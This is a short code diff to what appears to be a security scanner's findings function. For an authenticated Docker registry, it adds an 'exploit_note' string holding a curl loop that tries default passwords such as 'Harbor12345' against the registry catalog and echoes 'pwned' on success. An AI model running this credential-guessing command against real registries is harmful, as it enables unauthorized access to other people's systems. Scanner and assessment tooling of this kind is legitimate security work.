@@ -171,7 +171,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "docker",
                     f"docker login {h.ip}:{p.portid}",
                     "Ensure the registry keeps requiring auth on both read and write.",
-                    [], kind="dockerreg_authed"))
+                    [], kind="dockerreg_authed",
+                    exploit_note=(
+                        "for pw in admin registry password Harbor12345; do "
+                        "curl -sku admin:$pw http://<ip>:5000/v2/_catalog && "
+                        "echo pwned:$pw; done"),
+                    depth_tier="t0"))
     return out
 
 
